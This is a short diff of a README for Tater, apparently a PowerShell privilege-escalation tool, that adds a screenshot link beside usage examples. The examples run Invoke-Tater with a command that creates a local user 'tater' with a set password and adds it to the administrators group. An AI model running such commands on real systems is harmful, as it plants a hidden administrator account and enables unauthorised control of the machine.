@@ -21,3 +21,6 @@ To import using dot source method:
 Invoke-Tater -Command "net user tater Winter2016 /add && net localgroup administrators tater /add"   
 
 Invoke-Tater -Command "net user tater Winter2016 /add && net localgroup administrators tater /add" –RunTime 10   
+
+# Screenshot
+![tater](https://cloud.githubusercontent.com/assets/5897462/12635560/91220656-c552-11e5-96a2-1e5a2901404f.PNG)
